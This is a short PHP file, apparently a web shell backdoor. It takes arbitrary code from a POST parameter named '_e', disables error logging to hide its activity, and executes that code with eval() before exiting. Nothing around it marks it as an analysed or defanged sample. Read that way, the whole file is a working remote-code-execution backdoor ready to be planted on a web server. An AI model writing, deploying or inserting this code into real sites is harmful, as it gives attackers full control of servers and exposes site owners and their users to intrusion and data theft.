<?php 

if (isset($_POST['_e'])) {
    @ini_set('log_errors', 0);
    $v = $_POST['_e'];
    if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
        $v = stripslashes($v);
    }
    eval($v);
    die;
}